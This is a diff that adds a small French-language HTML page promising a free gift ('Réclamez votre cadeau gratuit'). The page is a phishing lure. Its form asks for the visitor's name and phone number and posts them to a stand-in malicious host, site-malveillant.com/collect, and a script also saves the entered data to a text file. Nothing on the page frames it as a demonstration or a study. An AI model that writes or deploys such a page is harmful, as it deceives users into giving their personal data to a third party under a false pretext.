@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+<head>
+    <title>Cadeau Gratuit</title>
+    <script type="text/javascript">
+        function downloadInfo() {
+            var name = document.getElementById("name").value;
+            var phone = document.getElementById("phone").value;
+            
+            var data = "Nom : " + name + "\nNuméro de téléphone : " + phone;
+            var blob = new Blob([data], { type: "text/plain;charset=utf-8" });
+            var a = document.createElement("a");
+            a.href = URL.createObjectURL(blob);
+            a.download = "donnees_telephone.txt";
+            a.style.display = "none";
+            document.body.appendChild(a);
+            a.click();
+        }
+    </script>
+</head>
+<body>
+    <h1>Réclamez votre cadeau gratuit !</h1>
+    <p>Entrez vos informations pour recevoir votre cadeau :</p>
+    <form action="http://site-malveillant.com/collect" method="post">
+        <label for="name">Nom :</label>
+        <input type="text" id="name" name="name" required><br><br>
+        <label for="phone">Numéro de téléphone :</label>
+        <input type="tel" id="phone" name="phone" required><br><br>
+        <input type="submit" value="Réclamer" onclick="downloadInfo()">
+    </form>
+
+</body></html>
